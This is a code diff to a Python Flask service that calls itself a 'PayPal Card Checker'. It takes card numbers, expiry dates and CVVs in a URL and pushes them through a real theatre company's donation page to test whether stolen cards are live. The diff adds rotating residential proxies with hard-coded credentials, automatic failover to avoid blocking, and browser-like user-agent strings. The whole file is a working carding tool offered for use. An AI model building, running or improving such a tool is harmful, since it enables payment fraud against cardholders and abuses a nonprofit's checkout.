@@ -2,34 +2,72 @@ import requests
 import base64
 import re
 import random
+import time
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# Proxy list - tere diye hue proxies properly formatted
-PROXY_LIST = [
-    {'http': 'http://iodpfcwa:a57d253xmbhn@142.111.48.253:7030', 'https': 'http://iodpfcwa:a57d253xmbhn@142.111.48.253:7030'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@31.59.20.176:6754', 'https': 'http://iodpfcwa:a57d253xmbhn@31.59.20.176:6754'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@23.95.150.145:6114', 'https': 'http://iodpfcwa:a57d253xmbhn@23.95.150.145:6114'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@198.23.239.134:6540', 'https': 'http://iodpfcwa:a57d253xmbhn@198.23.239.134:6540'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@45.38.107.97:6014', 'https': 'http://iodpfcwa:a57d253xmbhn@45.38.107.97:6014'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@107.172.163.27:6543', 'https': 'http://iodpfcwa:a57d253xmbhn@107.172.163.27:6543'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@198.105.121.200:6462', 'https': 'http://iodpfcwa:a57d253xmbhn@198.105.121.200:6462'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@64.137.96.74:6641', 'https': 'http://iodpfcwa:a57d253xmbhn@64.137.96.74:6641'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@216.10.27.159:6837', 'https': 'http://iodpfcwa:a57d253xmbhn@216.10.27.159:6837'},
-    {'http': 'http://iodpfcwa:a57d253xmbhn@142.111.67.146:5611', 'https': 'http://iodpfcwa:a57d253xmbhn@142.111.67.146:5611'}
+# QUANTUM RESIDENTIAL ROTATING PROXIES
+QUANTUM_PROXY = {
+    'http': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000',
+    'https': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000'
+}
+
+# BACKUP RENDER PROXIES (Fallback)
+RENDER_PROXIES = [
+    {'http': 'http://bbecjchp:te3mfic28iaw@proxy-1-px1a.onrender.com:7030', 'https': 'http://bbecjchp:te3mfic28iaw@proxy-1-px1a.onrender.com:7030'},
+    {'http': 'http://bbecjchp:te3mfic28iaw@proxy-2-r9zk.onrender.com:7030', 'https': 'http://bbecjchp:te3mfic28iaw@proxy-2-r9zk.onrender.com:7030'},
+    {'http': 'http://bbecjchp:te3mfic28iaw@proxy-3-qx41.onrender.com:7030', 'https': 'http://bbecjchp:te3mfic28iaw@proxy-3-qx41.onrender.com:7030'}
 ]
 
-def get_random_proxy():
-    return random.choice(PROXY_LIST) if PROXY_LIST else None
+class AdvancedProxyManager:
+    def __init__(self):
+        self.quantum_proxy = QUANTUM_PROXY
+        self.render_proxies = RENDER_PROXIES
+        self.current_proxy_type = 'quantum'  # Start with quantum
+        self.fail_count = 0
+        self.max_fail_before_switch = 3
+        
+    def get_proxy(self):
+        """Get best available proxy with automatic failover"""
+        if self.current_proxy_type == 'quantum' and self.fail_count < self.max_fail_before_switch:
+            print("🎯 Using: Quantum Residential Proxy (Rotating IP)")
+            return self.quantum_proxy, 'quantum'
+        else:
+            # Switch to render proxies
+            proxy = random.choice(self.render_proxies)
+            proxy_name = f"render-proxy-{self.render_proxies.index(proxy) + 1}"
+            print(f"🔄 Using: {proxy_name} (Fallback)")
+            self.current_proxy_type = 'render'
+            return proxy, 'render'
+    
+    def report_success(self):
+        """Report successful request"""
+        if self.current_proxy_type == 'quantum':
+            self.fail_count = 0  # Reset fail count on success
+            
+    def report_failure(self):
+        """Report failed request"""
+        self.fail_count += 1
+        if self.fail_count >= self.max_fail_before_switch and self.current_proxy_type == 'quantum':
+            print("🚨 Switching to Render proxies due to Quantum failures")
+            self.current_proxy_type = 'render'
+    
+    def reset_to_quantum(self):
+        """Reset back to quantum proxies"""
+        if self.current_proxy_type == 'render' and self.fail_count == 0:
+            self.current_proxy_type = 'quantum'
+            print("🔁 Switching back to Quantum proxies")
+
+# Initialize proxy manager
+proxy_manager = AdvancedProxyManager()
 
 @app.route('/cc=<cc>|<mm>|<yy>|<cvv>', methods=['GET'])
 def check_card(cc, mm, yy, cvv):
-    session = requests.session()
+    session = requests.Session()
     
-    # Random proxy select karo
-    proxy = get_random_proxy()
-    print(f"Using proxy: {proxy['http'].split('@')[1] if proxy else 'No Proxy'}")
+    # Get proxy with automatic failover
+    proxy, proxy_type = proxy_manager.get_proxy()
 
     try:
         # Step 1: Get donation page with proxy
@@ -46,7 +84,7 @@ def check_card(cc, mm, yy, cvv):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
 
         response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, proxies=proxy, timeout=30)
@@ -88,7 +126,7 @@ def check_card(cc, mm, yy, cvv):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
 
         params = {
@@ -152,7 +190,7 @@ def check_card(cc, mm, yy, cvv):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'cross-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         }
 
         json_data = {
@@ -181,10 +219,55 @@ def check_card(cc, mm, yy, cvv):
             timeout=30
         )
 
-        return jsonify(response.json())
+        # Success - update proxy manager
+        proxy_manager.report_success()
+        
+        result_data = response.json()
+        result_data['proxy_used'] = proxy_type
+        result_data['status'] = 'SUCCESS'
+        
+        return jsonify(result_data)
 
     except Exception as e:
-        return jsonify({'error': f'Proxy/Request failed: {str(e)}'})
+        # Failure - update proxy manager
+        proxy_manager.report_failure()
+        
+        return jsonify({
+            'error': f'Proxy/Request failed: {str(e)}',
+            'proxy_used': proxy_type,
+            'status': 'FAILED'
+        })
+
+@app.route('/proxy-status', methods=['GET'])
+def proxy_status():
+    """Get current proxy status"""
+    status = {
+        'current_proxy': proxy_manager.current_proxy_type,
+        'quantum_fail_count': proxy_manager.fail_count,
+        'available_proxies': len(proxy_manager.render_proxies) + 1,  # +1 for quantum
+        'max_fail_before_switch': proxy_manager.max_fail_before_switch
+    }
+    return jsonify(status)
+
+@app.route('/reset-proxy', methods=['GET'])
+def reset_proxy():
+    """Reset proxy to quantum"""
+    proxy_manager.reset_to_quantum()
+    return jsonify({'status': 'Reset to Quantum proxy'})
+
+@app.route('/')
+def home():
+    return """
+    <h1>🔥 PayPal Card Checker with Quantum Proxies</h1>
+    <p><b>Endpoint:</b> /cc=number|mm|yy|cvv</p>
+    <p><b>Proxy Status:</b> <a href="/proxy-status">/proxy-status</a></p>
+    <p><b>Reset Proxy:</b> <a href="/reset-proxy">/reset-proxy</a></p>
+    <p><b>Proxies:</b> Quantum Residential + Render Fallback</p>
+    """
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    print("🚀 PayPal Card Checker Started!")
+    print("🎯 Quantum Residential Proxies Integrated")
+    print("🔄 Automatic Failover System Active")
+    print("📊 Status: http://localhost:5000/proxy-status")
+    app.run(host='0.0.0.0', port=5000, debug=False)
